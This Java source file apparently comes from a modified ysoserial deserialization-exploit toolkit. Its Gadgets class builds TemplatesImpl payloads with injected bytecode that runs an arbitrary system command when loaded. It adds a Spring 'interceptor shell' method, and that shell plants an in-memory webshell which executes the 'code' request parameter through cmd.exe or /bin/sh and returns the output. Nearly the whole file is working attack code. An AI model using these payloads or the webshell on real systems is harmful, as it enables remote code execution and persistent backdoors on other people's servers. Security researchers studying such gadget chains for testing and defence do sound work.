package ysoserial.payloads.util;


import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import com.nqzero.permit.Permit;
import javassist.*;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.servlet.HandlerInterceptor;
import org.springframework.web.servlet.handler.AbstractHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.xml.transform.Templates;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings ( {
    "restriction", "rawtypes", "unchecked"
} )
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static class StubTransletPayload extends AbstractTranslet implements Serializable, HandlerInterceptor {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}


        @Override
        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static Object createTemplatesImpl (String command, String status) throws Exception {
        if (status.equals("SpringInterceptorShell")){
            return createTemplatesImplBySpringInterceptorShell(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
        }
        System.out.println("status: " + status + " 不存在，将使用默认模式");
        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replace("\\", "\\\\").replace("\"", "\\\"") +
            "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static Templates createTemplatesImplBySpringInterceptorShell( final String command, Class tplClass, Class<?> abstTranslet, Class<?> transFactory ) throws Exception {
        Templates tpl = (Templates) tplClass.newInstance();

        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(org.apache.xalan.xsltc.runtime.AbstractTranslet.class));
        pool.insertClassPath(new ClassClassPath(AbstractHandlerMapping.class));
        pool.insertClassPath(new ClassClassPath(WebApplicationContext.class));
        pool.importPackage("com.sun.org.apache.xalan.internal.xsltc.runtime");
        pool.importPackage("javax.servlet.http");
        pool.importPackage("javax.servlet");
        pool.importPackage("java.io");
        pool.importPackage("org.springframework.web.context.request");

        CtClass ctClass = pool.get(Gadgets.StubTransletPayload.class.getName());

        CtMethod preHandle = CtNewMethod.make("public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {\n" +
            "        try {\n" +
            "            PrintWriter writer = response.getWriter();\n" +
            "            String arg0 = request.getParameter(\"code\");\n" +
            "            if (arg0 != null) {\n" +
            "                String o = \"\";\n" +
            "                ProcessBuilder p;\n" +
            "                if (System.getProperty(\"os.name\").toLowerCase().contains(\"win\")) {\n" +
            "                    p = new ProcessBuilder(new String[]{\"cmd.exe\", \"/c\", arg0});\n" +
            "                } else {\n" +
            "                    p = new ProcessBuilder(new String[]{\"/bin/sh\", \"-c\", arg0});\n" +
            "                }\n" +
            "                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(\"\\\\A\");\n" +
            "                o = c.hasNext() ? c.next() : o;\n" +
            "                c.close();\n" +
            "                writer.write(o);\n" +
            "                writer.flush();\n" +
            "                writer.close();\n" +
            "            }\n" +
            "            return false;\n" +
            "        } catch (IOException e) {\n" +
            "            throw new RuntimeException(e);\n" +
            "        }\n" +
            "    }", ctClass);
        ctClass.addMethod(preHandle);


        String static_block = "try {\n" +
            "            org.springframework.web.context.WebApplicationContext context = (org.springframework.web.context.WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0);\n" +
            "            org.springframework.web.servlet.handler.AbstractHandlerMapping abstractHandlerMapping = (org.springframework.web.servlet.handler.AbstractHandlerMapping) context.getBean(\"requestMappingHandlerMapping\");\n" +
            "            java.lang.reflect.Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField(\"adaptedInterceptors\");\n" +
            "            field.setAccessible(true);\n" +
            "            java.util.ArrayList adaptedInterceptors = (java.util.ArrayList) field.get(abstractHandlerMapping);\n" +
            "            tmp.BadInterceptor_within aaa = new tmp.BadInterceptor_within();\n" +
            "            adaptedInterceptors.add(aaa);\n" +
            "            System.out.println(\"Interceptor has been added\");\n" +
            "        }catch (java.lang.Exception e){}";

        ctClass.makeClassInitializer().insertAfter(static_block);

        ctClass.setName("tmp.BadInterceptor_within");


        CtClass superClass = pool.get(abstTranslet.getName());
        ctClass.setSuperclass(superClass);


        byte[] classBytes = ctClass.toBytecode();

        Reflections.setFieldValue(tpl, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)});
        Reflections.setFieldValue(tpl, "_name", "pwnr");
        Reflections.setFieldValue(tpl, "_tfactory", transFactory.newInstance());

        return tpl;
    }


    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}
